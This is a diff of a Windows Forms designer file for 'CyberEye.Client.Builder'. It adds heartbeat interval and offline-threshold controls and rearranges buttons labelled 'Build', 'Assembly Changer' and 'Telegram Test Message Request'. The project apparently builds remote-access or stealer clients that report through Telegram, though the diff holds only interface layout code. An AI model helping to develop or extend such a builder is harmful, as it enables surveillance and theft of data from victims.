@@ -85,11 +85,18 @@
             this.TestMsgRequestBtn = new System.Windows.Forms.Button();
             this.listViewLog = new System.Windows.Forms.ListView();
             this.dataGridViewLog = new System.Windows.Forms.DataGridView();
+            this.label18 = new System.Windows.Forms.Label();
+            this.label19 = new System.Windows.Forms.Label();
+            this.numericUpDown4 = new System.Windows.Forms.NumericUpDown();
+            this.label20 = new System.Windows.Forms.Label();
+            this.numericUpDown5 = new System.Windows.Forms.NumericUpDown();
             ((System.ComponentModel.ISupportInitialize)(this.numericUpDown1)).BeginInit();
             ((System.ComponentModel.ISupportInitialize)(this.numericUpDown2)).BeginInit();
             ((System.ComponentModel.ISupportInitialize)(this.numericUpDown3)).BeginInit();
             ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
             ((System.ComponentModel.ISupportInitialize)(this.dataGridViewLog)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown4)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown5)).BeginInit();
             this.SuspendLayout();
             // 
             // button1
@@ -97,9 +104,9 @@
             this.button1.BackColor = System.Drawing.SystemColors.ActiveCaptionText;
             this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 18F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.button1.ForeColor = System.Drawing.SystemColors.ButtonFace;
-            this.button1.Location = new System.Drawing.Point(646, 451);
+            this.button1.Location = new System.Drawing.Point(757, 451);
             this.button1.Name = "button1";
-            this.button1.Size = new System.Drawing.Size(144, 78);
+            this.button1.Size = new System.Drawing.Size(236, 78);
             this.button1.TabIndex = 1;
             this.button1.Text = "Build";
             this.button1.UseVisualStyleBackColor = false;
@@ -547,7 +554,7 @@
             // 
             // textBox8
             // 
-            this.textBox8.Location = new System.Drawing.Point(465, 207);
+            this.textBox8.Location = new System.Drawing.Point(483, 224);
             this.textBox8.Multiline = true;
             this.textBox8.Name = "textBox8";
             this.textBox8.Size = new System.Drawing.Size(250, 20);
@@ -556,7 +563,7 @@
             // 
             // textBox9
             // 
-            this.textBox9.Location = new System.Drawing.Point(453, 233);
+            this.textBox9.Location = new System.Drawing.Point(471, 250);
             this.textBox9.Multiline = true;
             this.textBox9.Name = "textBox9";
             this.textBox9.Size = new System.Drawing.Size(262, 20);
@@ -565,7 +572,7 @@
             // 
             // textBox10
             // 
-            this.textBox10.Location = new System.Drawing.Point(453, 259);
+            this.textBox10.Location = new System.Drawing.Point(471, 276);
             this.textBox10.Multiline = true;
             this.textBox10.Name = "textBox10";
             this.textBox10.Size = new System.Drawing.Size(262, 20);
@@ -575,7 +582,7 @@
             // label15
             // 
             this.label15.AutoSize = true;
-            this.label15.Location = new System.Drawing.Point(718, 210);
+            this.label15.Location = new System.Drawing.Point(736, 227);
             this.label15.Name = "label15";
             this.label15.Size = new System.Drawing.Size(78, 13);
             this.label15.TabIndex = 48;
@@ -584,7 +591,7 @@
             // label16
             // 
             this.label16.AutoSize = true;
-            this.label16.Location = new System.Drawing.Point(718, 236);
+            this.label16.Location = new System.Drawing.Point(736, 253);
             this.label16.Name = "label16";
             this.label16.Size = new System.Drawing.Size(87, 13);
             this.label16.TabIndex = 49;
@@ -593,7 +600,7 @@
             // label17
             // 
             this.label17.AutoSize = true;
-            this.label17.Location = new System.Drawing.Point(718, 259);
+            this.label17.Location = new System.Drawing.Point(736, 276);
             this.label17.Name = "label17";
             this.label17.Size = new System.Drawing.Size(82, 13);
             this.label17.TabIndex = 50;
@@ -604,9 +611,9 @@
             this.button8.BackColor = System.Drawing.SystemColors.ActiveCaptionText;
             this.button8.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.button8.ForeColor = System.Drawing.SystemColors.ButtonFace;
-            this.button8.Location = new System.Drawing.Point(471, 451);
+            this.button8.Location = new System.Drawing.Point(546, 451);
             this.button8.Name = "button8";
-            this.button8.Size = new System.Drawing.Size(169, 78);
+            this.button8.Size = new System.Drawing.Size(205, 78);
             this.button8.TabIndex = 51;
             this.button8.Text = "Assembly Changer";
             this.button8.UseVisualStyleBackColor = false;
@@ -617,7 +624,7 @@
             this.button9.BackColor = System.Drawing.SystemColors.ActiveCaptionText;
             this.button9.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.button9.ForeColor = System.Drawing.SystemColors.ButtonFace;
-            this.button9.Location = new System.Drawing.Point(372, 451);
+            this.button9.Location = new System.Drawing.Point(450, 451);
             this.button9.Name = "button9";
             this.button9.Size = new System.Drawing.Size(90, 78);
             this.button9.TabIndex = 52;
@@ -628,9 +635,9 @@
             // pictureBox1
             // 
             this.pictureBox1.BackgroundImage = global::CyberEye.Client.Builder.Properties.Resources.cybereye;
-            this.pictureBox1.Location = new System.Drawing.Point(-95, -185);
+            this.pictureBox1.Location = new System.Drawing.Point(-27, -173);
             this.pictureBox1.Name = "pictureBox1";
-            this.pictureBox1.Size = new System.Drawing.Size(920, 744);
+            this.pictureBox1.Size = new System.Drawing.Size(1049, 744);
             this.pictureBox1.TabIndex = 0;
             this.pictureBox1.TabStop = false;
             this.pictureBox1.Click += new System.EventHandler(this.pictureBox1_Click);
@@ -642,7 +649,7 @@
             this.TestMsgRequestBtn.ForeColor = System.Drawing.SystemColors.ButtonFace;
             this.TestMsgRequestBtn.Location = new System.Drawing.Point(229, 451);
             this.TestMsgRequestBtn.Name = "TestMsgRequestBtn";
-            this.TestMsgRequestBtn.Size = new System.Drawing.Size(135, 78);
+            this.TestMsgRequestBtn.Size = new System.Drawing.Size(207, 78);
             this.TestMsgRequestBtn.TabIndex = 53;
             this.TestMsgRequestBtn.Text = "Telegram Test Message Request";
             this.TestMsgRequestBtn.UseVisualStyleBackColor = false;
@@ -663,14 +670,81 @@
             this.dataGridViewLog.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
             this.dataGridViewLog.Location = new System.Drawing.Point(229, 331);
             this.dataGridViewLog.Name = "dataGridViewLog";
-            this.dataGridViewLog.Size = new System.Drawing.Size(559, 114);
+            this.dataGridViewLog.Size = new System.Drawing.Size(767, 114);
             this.dataGridViewLog.TabIndex = 55;
+            // 
+            // label18
+            // 
+            this.label18.AutoSize = true;
+            this.label18.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label18.Location = new System.Drawing.Point(816, 74);
+            this.label18.Name = "label18";
+            this.label18.Size = new System.Drawing.Size(192, 20);
+            this.label18.TabIndex = 56;
+            this.label18.Text = "HEARTBEAT SYSTEM";
+            // 
+            // label19
+            // 
+            this.label19.AutoSize = true;
+            this.label19.Location = new System.Drawing.Point(817, 100);
+            this.label19.Name = "label19";
+            this.label19.Size = new System.Drawing.Size(152, 13);
+            this.label19.TabIndex = 58;
+            this.label19.Text = "Heartbeat Interval (in seconds)";
+            // 
+            // numericUpDown4
+            // 
+            this.numericUpDown4.Location = new System.Drawing.Point(817, 116);
+            this.numericUpDown4.Maximum = new decimal(new int[] {
+            1569325055,
+            23283064,
+            0,
+            0});
+            this.numericUpDown4.Name = "numericUpDown4";
+            this.numericUpDown4.Size = new System.Drawing.Size(107, 20);
+            this.numericUpDown4.TabIndex = 57;
+            this.numericUpDown4.Value = new decimal(new int[] {
+            30,
+            0,
+            0,
+            0});
+            // 
+            // label20
+            // 
+            this.label20.AutoSize = true;
+            this.label20.Location = new System.Drawing.Point(817, 155);
+            this.label20.Name = "label20";
+            this.label20.Size = new System.Drawing.Size(147, 13);
+            this.label20.TabIndex = 60;
+            this.label20.Text = "Offline Threshold (in seconds)";
+            // 
+            // numericUpDown5
+            // 
+            this.numericUpDown5.Location = new System.Drawing.Point(817, 171);
+            this.numericUpDown5.Maximum = new decimal(new int[] {
+            1569325055,
+            23283064,
+            0,
+            0});
+            this.numericUpDown5.Name = "numericUpDown5";
+            this.numericUpDown5.Size = new System.Drawing.Size(107, 20);
+            this.numericUpDown5.TabIndex = 59;
+            this.numericUpDown5.Value = new decimal(new int[] {
+            120,
+            0,
+            0,
+            0});
             // 
             // frmBuild
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
-            this.ClientSize = new System.Drawing.Size(800, 533);
+            this.ClientSize = new System.Drawing.Size(1020, 533);
+            this.Controls.Add(this.label20);
+            this.Controls.Add(this.numericUpDown5);
+            this.Controls.Add(this.label19);
+            this.Controls.Add(this.numericUpDown4);
+            this.Controls.Add(this.label18);
             this.Controls.Add(this.dataGridViewLog);
             this.Controls.Add(this.listViewLog);
             this.Controls.Add(this.TestMsgRequestBtn);
@@ -740,6 +814,8 @@
             ((System.ComponentModel.ISupportInitialize)(this.numericUpDown3)).EndInit();
             ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
             ((System.ComponentModel.ISupportInitialize)(this.dataGridViewLog)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown4)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown5)).EndInit();
             this.ResumeLayout(false);
             this.PerformLayout();
 
@@ -804,6 +880,11 @@
         private System.Windows.Forms.Button TestMsgRequestBtn;
         private System.Windows.Forms.ListView listViewLog;
         private System.Windows.Forms.DataGridView dataGridViewLog;
+        private System.Windows.Forms.Label label18;
+        private System.Windows.Forms.Label label19;
+        private System.Windows.Forms.NumericUpDown numericUpDown4;
+        private System.Windows.Forms.Label label20;
+        private System.Windows.Forms.NumericUpDown numericUpDown5;
     }
 }
 
